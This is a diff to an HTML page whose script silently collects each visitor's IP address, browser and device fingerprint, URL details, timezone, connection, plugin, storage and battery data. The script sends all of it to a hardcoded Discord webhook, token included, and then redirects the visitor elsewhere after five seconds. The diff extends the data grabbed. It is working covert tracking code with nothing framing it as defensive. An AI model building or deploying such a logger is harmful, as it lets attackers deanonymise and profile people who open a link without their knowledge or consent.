@@ -14,7 +14,7 @@
   <script>
     let visitorData = {};
 
-    // Basic Browser Information
+    // Basic browser information
     visitorData.userAgent = navigator.userAgent || 'N/A';
     visitorData.language = navigator.language || 'N/A';
     visitorData.languages = (navigator.languages && navigator.languages.join(', ')) || 'N/A';
@@ -25,14 +25,12 @@
     visitorData.appVersion = navigator.appVersion || 'N/A';
     visitorData.vendor = navigator.vendor || 'N/A';
     visitorData.appCodeName = navigator.appCodeName || 'N/A';
-    visitorData.product = navigator.product || 'N/A';
-    visitorData.productSub = navigator.productSub || 'N/A';
     visitorData.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
     visitorData.deviceMemory = navigator.deviceMemory || 'N/A';
     visitorData.maxTouchPoints = navigator.maxTouchPoints || 'N/A';
     visitorData.onLine = navigator.onLine;
 
-    // Screen Information
+    // Screen information
     visitorData.screenWidth = screen.width || 'N/A';
     visitorData.screenHeight = screen.height || 'N/A';
     visitorData.colorDepth = screen.colorDepth || 'N/A';
@@ -46,7 +44,7 @@
     visitorData.documentTitle = document.title || 'N/A';
     visitorData.documentLastModified = document.lastModified || 'N/A';
 
-    // Location and URL Information
+    // URL and location information
     visitorData.url = window.location.href || 'N/A';
     visitorData.hostname = window.location.hostname || 'N/A';
     visitorData.port = window.location.port || 'N/A';
@@ -55,12 +53,12 @@
     visitorData.search = window.location.search || 'N/A';
     visitorData.hash = window.location.hash || 'N/A';
 
-    // Time Information
+    // Time information
     visitorData.timestamp = new Date().toISOString();
     visitorData.timezoneOffset = new Date().getTimezoneOffset();
     visitorData.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
 
-    // Connection Information (if available)
+    // Connection information (if available)
     if (navigator.connection) {
       visitorData.connectionEffectiveType = navigator.connection.effectiveType || 'N/A';
       visitorData.connectionDownlink = navigator.connection.downlink || 'N/A';
@@ -75,107 +73,131 @@
       visitorData.connectionDownlinkMax = 'N/A';
     }
 
-    // Performance Information (if available)
-    if (window.performance && performance.navigation) {
-      visitorData.navigationType = performance.navigation.type || 'N/A';
-    } else {
-      visitorData.navigationType = 'N/A';
-    }
+    // Additional details
+    visitorData.plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') : 'N/A';
+    visitorData.mimeTypes = navigator.mimeTypes ? Array.from(navigator.mimeTypes).map(m => m.type).join(', ') : 'N/A';
+    visitorData.localStorageLength = localStorage.length;
+    visitorData.sessionStorageLength = sessionStorage.length;
 
-    // Screen Orientation (if available)
-    if (screen.orientation) {
-      visitorData.screenOrientation = screen.orientation.type || 'N/A';
-    } else {
-      visitorData.screenOrientation = 'N/A';
-    }
+    // Initialize battery info with defaults
+    visitorData.batteryCharging = 'N/A';
+    visitorData.batteryLevel = 'N/A';
+    visitorData.batteryChargingTime = 'N/A';
+    visitorData.batteryDischargingTime = 'N/A';
 
-    // Prepare and send data to Discord via webhook in two embeds (50 fields)
+    // Prepare and send data to Discord via webhook in three embeds
     function sendData() {
-      let fields = [
-        { name: "IP Address", value: visitorData.ip || 'N/A', inline: false },
-        { name: "User Agent", value: visitorData.userAgent, inline: false },
-        { name: "Language", value: visitorData.language, inline: true },
-        { name: "Languages", value: visitorData.languages, inline: true },
-        { name: "Platform", value: visitorData.platform, inline: true },
-        { name: "Cookies Enabled", value: String(visitorData.cookieEnabled), inline: true },
-        { name: "Do Not Track", value: visitorData.doNotTrack, inline: true },
-        { name: "App Name", value: visitorData.appName, inline: true },
-        { name: "App Version", value: visitorData.appVersion, inline: true },
-        { name: "Vendor", value: visitorData.vendor, inline: true },
-        { name: "App Code Name", value: visitorData.appCodeName, inline: true },
-        { name: "Product", value: visitorData.product, inline: true },
-        { name: "Product Sub", value: visitorData.productSub, inline: true },
-        { name: "Hardware Concurrency", value: String(visitorData.hardwareConcurrency), inline: true },
-        { name: "Device Memory (GB)", value: String(visitorData.deviceMemory), inline: true },
-        { name: "Max Touch Points", value: String(visitorData.maxTouchPoints), inline: true },
-        { name: "Online", value: String(visitorData.onLine), inline: true },
-        { name: "Screen Width", value: String(visitorData.screenWidth), inline: true },
-        { name: "Screen Height", value: String(visitorData.screenHeight), inline: true },
-        { name: "Color Depth", value: String(visitorData.colorDepth), inline: true },
-        { name: "Available Screen Width", value: String(visitorData.availWidth), inline: true },
-        { name: "Available Screen Height", value: String(visitorData.availHeight), inline: true },
-        { name: "Device Pixel Ratio", value: String(visitorData.devicePixelRatio), inline: true },
-        { name: "Window Inner Width", value: String(visitorData.innerWidth), inline: true },
-        { name: "Window Inner Height", value: String(visitorData.innerHeight), inline: true },
-        { name: "Window Outer Width", value: String(visitorData.outerWidth), inline: true },
-        { name: "Window Outer Height", value: String(visitorData.outerHeight), inline: true },
-        { name: "Document Title", value: visitorData.documentTitle, inline: false },
-        { name: "Document Last Modified", value: visitorData.documentLastModified, inline: false },
-        { name: "URL", value: visitorData.url, inline: false },
-        { name: "Hostname", value: visitorData.hostname, inline: true },
-        { name: "Port", value: visitorData.port || 'N/A', inline: true },
-        { name: "Protocol", value: visitorData.protocol, inline: true },
-        { name: "Pathname", value: visitorData.pathname, inline: true },
-        { name: "Search Query", value: visitorData.search || 'N/A', inline: true },
-        { name: "Hash", value: visitorData.hash || 'N/A', inline: true },
-        { name: "Timestamp", value: visitorData.timestamp, inline: false },
-        { name: "Timezone Offset (min)", value: String(visitorData.timezoneOffset), inline: true },
-        { name: "Time Zone", value: visitorData.timeZone, inline: true },
-        { name: "Connection Effective Type", value: visitorData.connectionEffectiveType, inline: true },
-        { name: "Connection Downlink", value: String(visitorData.connectionDownlink), inline: true },
-        { name: "Connection RTT", value: String(visitorData.connectionRtt), inline: true },
-        { name: "Connection Save Data", value: String(visitorData.connectionSaveData), inline: true },
-        { name: "Connection Downlink Max", value: String(visitorData.connectionDownlinkMax), inline: true },
-        { name: "Navigation Type", value: String(visitorData.navigationType), inline: true },
-        { name: "Screen Orientation", value: visitorData.screenOrientation, inline: true }
-      ];
-
-      // Split the 50 fields into 2 embeds (25 fields each, Discord limit)
       let embed1 = {
         title: "Visitor Data (Part 1)",
-        description: "Extended visitor information collected automatically.",
-        fields: fields.slice(0, 25)
+        description: "Basic browser and screen information.",
+        fields: [
+          { name: "IP Address", value: visitorData.ip || 'N/A', inline: false },
+          { name: "User Agent", value: visitorData.userAgent, inline: false },
+          { name: "Language", value: visitorData.language, inline: true },
+          { name: "Languages", value: visitorData.languages, inline: true },
+          { name: "Platform", value: visitorData.platform, inline: true },
+          { name: "Cookies Enabled", value: String(visitorData.cookieEnabled), inline: true },
+          { name: "Do Not Track", value: visitorData.doNotTrack, inline: true },
+          { name: "App Name", value: visitorData.appName, inline: true },
+          { name: "App Version", value: visitorData.appVersion, inline: true },
+          { name: "Vendor", value: visitorData.vendor, inline: true },
+          { name: "App Code Name", value: visitorData.appCodeName, inline: true },
+          { name: "Hardware Concurrency", value: String(visitorData.hardwareConcurrency), inline: true },
+          { name: "Device Memory (GB)", value: String(visitorData.deviceMemory), inline: true },
+          { name: "Max Touch Points", value: String(visitorData.maxTouchPoints), inline: true },
+          { name: "Online", value: String(visitorData.onLine), inline: true },
+          { name: "Screen Width", value: String(visitorData.screenWidth), inline: true },
+          { name: "Screen Height", value: String(visitorData.screenHeight), inline: true },
+          { name: "Color Depth", value: String(visitorData.colorDepth), inline: true },
+          { name: "Available Screen Width", value: String(visitorData.availWidth), inline: true },
+          { name: "Available Screen Height", value: String(visitorData.availHeight), inline: true },
+          { name: "Device Pixel Ratio", value: String(visitorData.devicePixelRatio), inline: true },
+          { name: "Window Inner Width", value: String(visitorData.innerWidth), inline: true },
+          { name: "Window Inner Height", value: String(visitorData.innerHeight), inline: true },
+          { name: "Window Outer Width", value: String(visitorData.outerWidth), inline: true }
+        ]
       };
+
       let embed2 = {
         title: "Visitor Data (Part 2)",
-        description: "Extended visitor information collected automatically.",
-        fields: fields.slice(25, 50)
+        description: "Location, time, and connection details.",
+        fields: [
+          { name: "Window Outer Height", value: String(visitorData.outerHeight), inline: true },
+          { name: "Document Title", value: visitorData.documentTitle, inline: false },
+          { name: "Document Last Modified", value: visitorData.documentLastModified, inline: false },
+          { name: "URL", value: visitorData.url, inline: false },
+          { name: "Hostname", value: visitorData.hostname, inline: true },
+          { name: "Port", value: visitorData.port || 'N/A', inline: true },
+          { name: "Protocol", value: visitorData.protocol, inline: true },
+          { name: "Pathname", value: visitorData.pathname, inline: true },
+          { name: "Search Query", value: visitorData.search || 'N/A', inline: true },
+          { name: "Hash", value: visitorData.hash || 'N/A', inline: true },
+          { name: "Timestamp", value: visitorData.timestamp, inline: false },
+          { name: "Timezone Offset (min)", value: String(visitorData.timezoneOffset), inline: true },
+          { name: "Time Zone", value: visitorData.timeZone, inline: true },
+          { name: "Connection Effective Type", value: visitorData.connectionEffectiveType, inline: true },
+          { name: "Connection Downlink", value: String(visitorData.connectionDownlink), inline: true },
+          { name: "Connection RTT", value: String(visitorData.connectionRtt), inline: true },
+          { name: "Connection Save Data", value: String(visitorData.connectionSaveData), inline: true },
+          { name: "Connection Downlink Max", value: String(visitorData.connectionDownlinkMax), inline: true },
+          { name: "Plugins", value: visitorData.plugins || 'N/A', inline: false },
+          { name: "MIME Types", value: visitorData.mimeTypes || 'N/A', inline: false },
+          { name: "Local Storage Length", value: String(visitorData.localStorageLength), inline: true },
+          { name: "Session Storage Length", value: String(visitorData.sessionStorageLength), inline: true },
+          { name: "Navigation Type", value: String(visitorData.navigationType || 'N/A'), inline: true },
+          { name: "Screen Orientation", value: visitorData.screenOrientation || 'N/A', inline: true }
+        ]
+      };
+
+      let embed3 = {
+        title: "Visitor Data (Part 3)",
+        description: "Additional details including battery information.",
+        fields: [
+          { name: "Battery Charging", value: String(visitorData.batteryCharging), inline: true },
+          { name: "Battery Level", value: String(visitorData.batteryLevel), inline: true },
+          { name: "Battery Charging Time", value: String(visitorData.batteryChargingTime), inline: true },
+          { name: "Battery Discharging Time", value: String(visitorData.batteryDischargingTime), inline: true }
+        ]
       };
 
       fetch('https://discord.com/api/webhooks/1350682115775270963/AAPYhKBmmYV9ZcBb_zKAW-iUiqaypM1Fm83rAaxfJkI2T_jL2e4LYOzOrz0ShDyzsZ3e', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          embeds: [embed1, embed2]
+          embeds: [embed1, embed2, embed3]
         })
       }).catch(err => console.error('Webhook error:', err));
     }
 
-    // Get public IP and then send all data
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        visitorData.ip = data.ip;
-        sendData();
-      })
-      .catch(error => {
-        visitorData.ip = 'Unavailable';
-        sendData();
-      });
+    function collectAndSend() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          visitorData.ip = data.ip;
+          sendData();
+        })
+        .catch(error => {
+          visitorData.ip = 'Unavailable';
+          sendData();
+        });
+    }
+
+    // Get battery info if available, then collect and send all data
+    if (navigator.getBattery) {
+      navigator.getBattery().then(function(battery) {
+        visitorData.batteryCharging = battery.charging;
+        visitorData.batteryLevel = battery.level;
+        visitorData.batteryChargingTime = battery.chargingTime;
+        visitorData.batteryDischargingTime = battery.dischargingTime;
+        collectAndSend();
+      }).catch(collectAndSend);
+    } else {
+      collectAndSend();
+    }
 
     // Redirect after 5 seconds
     setTimeout(function() {
-      window.location.href = "https://www.youtube.com";
+      window.location.href = "https://example.com";
     }, 5000);
   </script>
 </body>
